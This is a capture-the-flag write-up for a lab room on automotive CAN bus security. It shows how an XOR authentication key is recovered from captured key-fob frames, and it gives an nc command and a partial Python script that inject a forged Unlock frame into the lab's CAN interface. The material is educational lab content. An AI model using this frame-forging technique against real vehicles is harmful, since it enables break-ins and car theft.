# Phantom Fob

{% embed url="https://tryhackme.com/room/phantomfob" %}

Automotive security — CAN bus analysis and rolling code exploitation. The fob has Lock and Horn buttons but no Unlock. We reverse the authentication formula from captured frames and forge an unlock command.

---

## Setup

The room exposes:
- **Port 8080** — Web dashboard showing the car's state (locked/unlocked)
- **Port 29536** — `socketcand` — raw CAN bus access

---

## Step 1 — Capture Known Actions

Connect to the CAN bus and dump traffic:

```bash
nc MACHINE_IP 29536
```

Or use a Python socket to read frames. Press **Lock** and **Horn** on the fob and record the CAN frames — note the ID, payload bytes, and how they change on each press.

---

## Step 2 — Understand the Frame Structure

Each frame contains:

| Field | Description |
|---|---|
| CAN ID | Identifies message type |
| Counter byte | Rolling counter — increments each message |
| Command byte | `0x01` = Lock, `0x02` = Horn, `0x??` = Unlock |
| Auth byte | Checksum/authentication value |

The auth byte follows this formula:

```
Auth = Counter XOR Secret_Key XOR Command
```

Since Counter and Command are visible in plaintext, extract the Secret Key:

```
Secret_Key = Auth XOR Counter XOR Command
```

---

## Step 3 — Craft the Unlock Frame

Write a Python script to:
1. Read the live rolling counter from the CAN bus
2. Try Unlock command values (enumerate the small space — `0x00`, `0x03`, `0x04`...)
3. Compute the auth byte for each using the extracted key
4. Inject the forged frame

```python
import socket

TARGET = "MACHINE_IP"
PORT = 29536

SECRET_KEY = 0xXX  # derived from captured frames
UNLOCK_CMD = 0x03  # enumerate until the dashboard unlocks

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TARGET, PORT))

# Read current counter from broadcast frames
# ... parse counter value ...

auth = counter ^ SECRET_KEY ^ UNLOCK_CMD

frame = f"< send {can_id} {len_byte} {counter:02x} {UNLOCK_CMD:02x} {auth:02x} >"
s.send(frame.encode())
```

---

## Step 4 — Unlock & Get Flag

Once the correct frame is sent, the web dashboard on port 8080 shows the car unlocking and displays the flag.

> The rolling counter and secret key are randomized per TryHackMe instance — run the script against your live machine to derive the exact values.

---

## 🏁 Questions & Answers

| Question | Answer |
|---|---|
| What protocol is used for vehicle communication? | CAN bus |
| What port exposes the CAN interface? | `29536` (socketcand) |
| Authentication formula | `Auth = Counter XOR Secret_Key XOR Command` |
| Flag | Shown on the web dashboard (port 8080) after injecting a valid Unlock frame |
